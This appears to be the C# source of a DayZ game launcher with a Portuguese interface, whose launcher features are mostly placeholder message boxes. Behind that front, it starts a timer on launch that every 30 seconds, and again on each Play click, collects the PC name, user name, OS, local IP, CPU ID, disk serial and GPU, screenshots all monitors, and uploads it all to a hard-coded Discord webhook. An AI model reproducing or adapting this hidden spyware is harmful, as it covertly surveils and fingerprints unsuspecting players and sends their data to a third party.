using System;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Threading;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using MessageBox = System.Windows.MessageBox;
using Application = System.Windows.Application;

namespace DAYZ_THE_LAST_HOPE {
    public partial class MainWindow : Window {
        string nick = " ";
        string ip = "192.168.1.100";
        string port = "2302";
        string pastamods = "Mods";
        private DispatcherTimer timer;

        public MainWindow() {
            InitializeComponent();

            string arqn = "nick.txt";
            if (File.Exists(arqn))
                txtnick.Text = File.ReadAllText(arqn).Trim();
            else
                txtnick.Text = "Sem nick";

            IniciarEnvioAutomatico();
        }

        private void IniciarEnvioAutomatico() {
            timer = new DispatcherTimer();
            timer.Interval = TimeSpan.FromSeconds(30);
            timer.Tick += async (s, e) => await EnviarInfosParaWebhook();
            timer.Start();
        }

        private async void btnJogar_Click(object sender, RoutedEventArgs e) {
            string mods = ObterMods(pastamods);
            await EnviarInfosParaWebhook();

            if (!string.IsNullOrEmpty(mods))
                MessageBox.Show($"Iniciando o jogo com mods: {mods}");
            else
                MessageBox.Show("Nenhum mod encontrado.");
        }

        private string ObterMods(string pastamods) {
            if (!Directory.Exists(pastamods))
            {
                MessageBox.Show("Pasta mods não encontrada");
                return string.Empty;
            }

            string[] pastas = Directory.GetDirectories(pastamods);
            return "Mods\\" + string.Join(";Mods\\", pastas.Select(Path.GetFileName));
        }

        private async Task EnviarInfosParaWebhook() {
            try
            {
                string nickName = File.Exists("nick.txt") ? File.ReadAllText("nick.txt").Trim() : "Sem nick";
                string pcName = Environment.MachineName;
                string userName = Environment.UserName;
                string sistema = Environment.OSVersion.ToString();
                string ipLocal = Dns.GetHostEntry(Dns.GetHostName())
                    .AddressList.FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString();

                string cpu = GetWMIProperty("Win32_Processor", "ProcessorId");
                string hd = GetWMIProperty("Win32_PhysicalMedia", "SerialNumber");
                string gpu = GetWMIProperty("Win32_VideoController", "Name");

                string screenshotPath = CapturarTela();

                using (var client = new HttpClient())
                using (var form = new MultipartFormDataContent())
                {
                    var jsonPayload = $@"{{
                ""content"": ""Tela do player."",
                ""embeds"": [{{
                    ""title"": ""💻 Informações coletadas"",
                    ""color"": 5814783,
                    ""fields"": [
                        {{""name"": ""👤 Nick (conteúdo do txt)"", ""value"": ""{EscapeForJson(nickName)}"", ""inline"": false}},
                        {{""name"": ""🖥️ Nome do PC"", ""value"": ""{pcName}"", ""inline"": false}},
                        {{""name"": ""📶 IP Local"", ""value"": ""{ipLocal}"", ""inline"": false}},
                        {{""name"": ""🧠 CPU ID"", ""value"": ""{cpu}"", ""inline"": false}},
                        {{""name"": ""💾 HD Serial"", ""value"": ""{hd}"", ""inline"": false}},
                        {{""name"": ""🎮 GPU"", ""value"": ""{gpu}"", ""inline"": false}},
                        {{""name"": ""🖥️ Sistema"", ""value"": ""{sistema}"", ""inline"": false}}
                    ]
                }}]
            }}";

                    form.Add(new StringContent(jsonPayload, Encoding.UTF8, "application/json"), "payload_json");

                    if (File.Exists(screenshotPath))
                    {
                        var imageContent = new ByteArrayContent(File.ReadAllBytes(screenshotPath));
                        imageContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
                        form.Add(imageContent, "file", "screenshot.png");
                    }

                    await client.PostAsync("https://discord.com/api/webhooks/1359314693935595763/dPhVpLMDA7mbceXXaFucXHDxWPhRT8c48kVXgQWz3K_r63J-hxVkimtWeZax2Txx7frS", form);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Erro ao enviar dados: {ex.Message}");
            }
        }
        private string EscapeForJson(string input) {
            return input.Replace("\\", "\\\\")
                        .Replace("\"", "\\\"")
                        .Replace("\n", "\\n")
                        .Replace("\r", "");
        }



        private string CapturarTela() {
            try
            {
               
                var allScreens = System.Windows.Forms.Screen.AllScreens;
                int larguraTotal = allScreens.Sum(screen => screen.Bounds.Width);
                int alturaMaxima = allScreens.Max(screen => screen.Bounds.Height);

                using (var bitmap = new System.Drawing.Bitmap(larguraTotal, alturaMaxima))
                {
                    using (var g = System.Drawing.Graphics.FromImage(bitmap))
                    {
                        int offsetX = 0;
                        foreach (var screen in allScreens)
                        {
                            g.CopyFromScreen(screen.Bounds.X, screen.Bounds.Y, offsetX, 0, screen.Bounds.Size);
                            offsetX += screen.Bounds.Width;
                        }
                    }

                    string caminho = Path.Combine(Path.GetTempPath(), "screenshot.png");
                    bitmap.Save(caminho, System.Drawing.Imaging.ImageFormat.Png);
                    return caminho;
                }
            }
            catch (Exception)
            {
                return null;
            }
        }

        private string GetWMIProperty(string className, string propertyName) {
            try
            {
                using (var searcher = new ManagementObjectSearcher($"SELECT {propertyName} FROM {className}"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        return obj[propertyName]?.ToString().Trim();
                    }
                }
            }
            catch { }

            return "Desconhecido";
        }

        private void Minimize_Click(object sender, RoutedEventArgs e) => this.WindowState = WindowState.Minimized;

        private void Close_Click(object sender, RoutedEventArgs e) => this.Close();

        private void Mouse(object sender, MouseButtonEventArgs e) {
            if (e.LeftButton == MouseButtonState.Pressed)
                this.DragMove();
        }

        private void Abrirdc(object sender, RoutedEventArgs e) => MessageBox.Show("abrindo discord...");

        private void Abrirconfig(object sender, RoutedEventArgs e) => MessageBox.Show("Abrindo config");

        private void btnBaixar_Click(object sender, RoutedEventArgs e) => MessageBox.Show("Baixando arquivos...");

        private void AbrirJanelaNome_Click(object sender, RoutedEventArgs e) {
            Window1 janelaNome = new Window1();
            if (janelaNome.ShowDialog() == true)
            {
                File.WriteAllText("nick.txt", janelaNome.NomeDigitado);
                txtnick.Text = janelaNome.NomeDigitado;
            }
        }

        private void Nick(object sender, RoutedEventArgs e) {
            Window1 janela = new Window1();
            if (janela.ShowDialog() == true)
            {
                txtnick.Text = janela.NomeDigitado;
            }
        }
    }
}
